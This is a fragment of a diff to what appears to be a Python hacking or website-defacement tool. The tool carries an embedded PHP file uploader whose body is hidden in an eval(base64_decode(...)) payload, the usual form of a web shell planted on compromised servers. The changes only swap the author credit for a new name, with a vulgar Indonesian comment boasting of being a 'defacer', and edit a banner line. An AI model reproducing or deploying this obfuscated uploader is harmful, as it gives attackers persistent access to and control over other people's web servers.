@@ -15,8 +15,8 @@ title = "<title>Upload your files</title>"
 uploader = '''
 <?php
 /*
-if You Decode This, Congratulations You Are 1337
-Encoded By Black_Phish
+Jika kamu decode file ini kamu adalah defacer kontol/1337
+Encoded By Thopik
 */
 eval("?>".base64_decode("PD9waHAKc2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFy
 dCgpOwplY2hvIGJhc2U2NF9kZWNvZGUoIlBDRkVUME5VV1ZCRklHaDBiV3crQ2p4b2RHMXNQZ284
@@ -46,7 +46,7 @@ auth = """
  |[+]Contact  : azurax22@gmail.com            |
  |____________________________________________|
                         """
-print(la7mar+" Hello! Bro... Welcome To")
+print(la7mar+" Hello! Bro. Welcome To")
 sleep(2)
 print(green+auth+la7mar)
 try:
